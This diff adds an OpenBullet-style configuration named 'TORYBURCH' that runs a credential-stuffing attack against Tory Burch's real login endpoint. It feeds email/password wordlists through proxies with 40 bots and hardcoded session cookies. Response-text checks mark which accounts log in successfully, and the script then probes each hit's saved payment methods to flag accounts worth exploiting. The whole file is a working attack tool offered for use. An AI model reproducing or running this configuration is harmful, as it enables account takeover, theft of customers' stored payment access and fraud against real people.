@@ -1,0 +1,65 @@
+[SETTINGS]
+{
+  "Name": "TORYBURCH",
+  "SuggestedBots": 40,
+  "LastModified": "2018-08-08T16:24:04.7215449+00:00",
+  "AdditionalInfo": "",
+  "Author": "XJ13",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://www.torysport.com/on/demandware.store/Sites-TorySport_US-Site/default/Login-ProcessJSON?callback=jQuery111102790722924632756_1537250676007" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.toryburch.com/account?dwcont=C1855570177" 
+REQUEST POST "https://www.toryburch.com/account?dwcont=C1855765076" AutoRedirect=TRUE 
+  CONTENT "dwfrm_login_username=<USER>&dwfrm_login_password=<PASS>&dwfrm_login_rememberme=true&dwfrm_login_securekey=370511831&dwfrm_login_login=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "__cfduid=df75117d62045be1634239c031ea6db9b1537250589; dwac_bcK1Uiaag3VtQaaacPokYWBAtR=wlg9UOh8xMDHsX-FNuYfm3CCM1nz3oQ6MbI%3D|demandaafhtoryburchus|||USD|false|US%2FEastern|true; cqcid=bck1avqQjbQritzYGy0R2B4pxy; dwpersonalization_9abe564a81388502d2cc4046fac2bf9c=b4d7b8348a74e5cb2d92e25d7320181001000000000; dwanonymous_9abe564a81388502d2cc4046fac2bf9c=bck1avqQjbQritzYGy0R2B4pxy; sid=wlg9UOh8xMDHsX-FNuYfm3CCM1nz3oQ6MbI; dwsecuretoken_9abe564a81388502d2cc4046fac2bf9c=8jp_YMAGT2TgL2bzUuJ4XDQfUrl8CKBvTw==; __cq_dnt=0; dw_dnt=0; fs_interstitial_popup_new_v1-cookie=true; dwsid=wzIeX5FcCtP8zE4d9cmaS3HoEFaK_kopCs-ykxkJqDwS9zUbv9lGMsx_ya94VYJJySJ-vOwZmBcbBWTbKkiFSA==; i10c.sid=1537250591788; optimizelyEndUserId=oeu1537250592312r0.725773949788443; i10c.uid=1537250592530: 6282; _gcl_au=1.1.850945969.1537250593; imail_e=; imail_sfmc_sub=null; imail_j=null; imail_l=null; imail_u=null; imail_jb=null; imail_mid=null; i10c_focloir=15:780b6f5ffe035d7e4a8f5daa9d17a282:0:98610c5a08135ad431f8b4c68133513c; _mibhv=anon-1537250593111-4742426845_6299; _ga=GA1.2.645930104.1537250593; _gid=GA1.2.1762819731.1537250593; ftr_ncd=6; __qca=P0-1266277822-1537250593285; rskxRunCookie=0; rCookie=jw5wugd14o0ctdhw9bag6s; gladlyCohort-e3d03368-a188-11e8-a536-73471cd22e7b={%22id%22:%223qvYHwgtRWOatUe2sOk-_g%22}; __cq_uuid=86c1cb20-bb08-11e8-b370-397a31d7cc37; __cq_seg=0~0.00!1~0.00!2~0.00!3~0.00!4~0.00!5~0.00!6~0.00!7~0.00!8~0.00!9~0.00; gtm_login_loc=my account; _aa7988=1x5bdb; stc115908=tsa:1537250593160.371162412.879817.9506349841329007.21:20180918063436|env:1%7C20181019060313%7C20180918063436%7C3%7C1054818:20190918060436|uid:1537250593159.349430642.96306753.115908.2070622921:20190918060436|srchist:1054818%3A1%3A20181019060313:20190918060436; forterToken=9a011494d4aa4dbead2ebb9115dbf68e_1537250676563__UDF43_6; lastRskxRun=1537250677754; amplitude_idtoryburch.com=eyJkZXZpY2VJZCI6Ijk2MzNlODFkLTMzYzMtNDc4Mi1iZDc1LTExOGE5NzIyM2UwYlIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTUzNzI1MDU5NDA1OSwibGFzdEV2ZW50VGltZSI6MTUzNzI1MDY3Nzc4MSwiZXZlbnRJZCI6MywiaWRlbnRpZnlJZCI6Mywic2VxdWVuY2VOdW1iZXIiOjZ9; i10c.bdddb=c2-f0103ZLNqAeI3BH6yYOfG7TZlRtCrMwzKDQfPMtvESnCuVjBtyWgLvhitYsMwusvP8qKKMdwC0WCtxjCRzTlNvZkQMtHIwsvP8rISRdqNNnroxoN6uTfBwCjlRTCqo58KDqfQugfJ2iHtK5bozTaHTcfq1oHqyckBxSfPMYlrNnsssolozT2QhWVhMtHlpVwKDQfPM0zrISCtxjCR2RgM2ZkQMtHAwsvP8rINHdKESncCsoBo01hJqeKlRtdb7jT08qkKNBjESNCtxDnjuTfBwCfv0oHqE7KfaHfPMYlrNnHu0jBW0WaGvZkQMtH68BqPDllxHdkIWiHWws6tzOfqqek9hEZloxqQllkPTYkwZiHtstmoz3aGvxWO2VsloxqQlpfPwYkJsxCtxjCRuTfByDjtSxCqOwyTJlkzLhiKNnrs1pHoz3eKzhfq1sLxusvzCvkVHdKIXqIoxOAy5aaGVdqpWoKRjxvKDQfPM50ESnCuVuBr5OfqqekHGl7hjxvKEOiKMDfJSx0ZXW6tzOgotZkQMtHFysvP8rINHdKESngGsoBo01aGvZkrMtrloxqUo; _gat_UA-446313-1=1" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://www.toryburch.com" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "Referer: https://www.toryburch.com/account?dwcont=C1855570177" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Sorry, this does not match our records." 
+    KEY "Check your spelling and try again." 
+  KEYCHAIN Success OR 
+    KEY "ORDER HISTORY" 
+REQUEST GET "https://www.toryburch.com/on/demandware.store/Sites-ToryBurch_US-Site/default/PaymentInstruments-List" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.toryburch.com/on/demandware.store/Sites-ToryBurch_US-Site/default/Account-ReadProfile" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "You have not saved a payment method yet." 
+  KEYCHAIN Success OR 
+    KEY "\">Make Primary Payment Method" 
